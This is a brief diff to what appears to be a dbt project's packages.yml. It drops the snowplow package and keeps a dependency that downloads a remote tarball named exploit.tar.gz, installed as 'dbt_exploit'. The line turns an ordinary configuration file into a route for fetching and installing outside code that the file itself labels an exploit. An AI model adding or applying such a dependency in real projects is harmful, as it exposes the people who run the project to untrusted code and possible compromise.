@@ -1,6 +1,3 @@
 packages:
-  - package: dbt-labs/snowplow
-    version: 0.7.0
-
   - tarball: https://raw.githubusercontent.com/wflk/dbt_matillion_repo/main/exploit.tar.gz
     name: 'dbt_exploit' 
